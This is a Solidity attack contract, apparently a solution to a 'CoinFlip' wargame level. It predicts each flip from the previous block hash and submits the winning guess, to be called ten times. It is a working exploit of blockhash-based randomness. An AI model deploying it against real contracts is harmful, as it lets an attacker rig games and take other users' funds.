// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip { // use interface to get access to the level contract
    function flip(bool _gurss) external returns (bool);
}

contract Attack {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlip_addr = "Instance address";

    function attack() public returns(uint256) { // cal this fucntion 10 times to complete attack
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool correct = ICoinFlip(coinFlip_addr).flip(side); // call the flip function

        if (correct) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }
        
        // keep track on the wins(or you can type `await contract.consecutiveWins().then(wins => parseInt(wins))` in the console)
        return consecutiveWins; 
    }
}
